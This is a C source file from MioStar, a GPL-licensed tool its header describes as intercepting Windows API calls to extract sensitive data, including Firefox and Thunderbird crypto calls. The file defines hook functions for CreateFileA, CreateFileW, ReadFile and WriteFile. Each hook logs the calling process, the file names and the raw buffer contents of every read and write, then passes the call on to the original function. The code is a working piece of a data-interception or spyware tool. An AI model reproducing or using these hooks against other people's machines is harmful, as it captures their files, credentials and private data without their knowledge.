/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */




#include <windows.h>
#include <stdio.h>
#include <Shlwapi.h>
#include "MioStar.h"
#include "FileFunctionsReplacement.h"


extern char gProcName[MAX_BUF_SIZE + 1];
extern char *gProcShortPath;

extern byte* CG_CreateFileA;
extern byte* CG_CreateFileW;
extern byte* CG_WriteFile;
extern byte* CG_ReadFile;





/*
 *
 *
 */


HANDLE WINAPI MyCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
  HANDLE lRetVal = INVALID_HANDLE_VALUE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCREATEFILEA fCreateFileA = (MYCREATEFILEA) CG_CreateFileA;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCreateFileA():FILE:%s:%s", gProcShortPath, lpFileName);
  printDebug(lTemp1, EVENT_FILE);



  if (fCreateFileA)
    lRetVal = fCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  return(lRetVal); 
}








/*
 *
 *
 */

HANDLE WINAPI MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
  HANDLE lRetVal = INVALID_HANDLE_VALUE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCREATEFILEW fCreateFileW = (MYCREATEFILEW) CG_CreateFileW;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCreateFileW():FILE:%s:%S", gProcShortPath, lpFileName);
  printDebug(lTemp1, EVENT_FILE);


  if (fCreateFileW)
    lRetVal = fCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  return(lRetVal); 
}




BOOL WINAPI MyWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[100 * (MAX_BUF_SIZE + 1)];
  MYWRITEFILE fWriteFile = (MYWRITEFILE) CG_WriteFile;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (lpBuffer != NULL && nNumberOfBytesToWrite > 0)
    stringify((char *) lpBuffer, nNumberOfBytesToWrite, lTemp2, sizeof(lTemp2)/2 - 1);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWriteFile():FILE:%s:%d:%s", gProcShortPath, nNumberOfBytesToWrite, lTemp2);
  printDebug(lTemp1, EVENT_FILE);


  if (fWriteFile)
    lRetVal = fWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  return(lRetVal); 
}



/*
 *
 *
 */

BOOL WINAPI MyReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[100 * (MAX_BUF_SIZE + 1)];
  MYREADFILE fReadFile = (MYREADFILE) CG_ReadFile;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (lpBuffer != NULL && nNumberOfBytesToRead > 0)
    stringify((char *) lpBuffer, nNumberOfBytesToRead, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyReadFile():FILE:%s:%d:%s", gProcShortPath, nNumberOfBytesToRead, lTemp2);
  printDebug(lTemp1, EVENT_FILE);


  if (fReadFile)
    lRetVal = fReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

  return(lRetVal); 
}




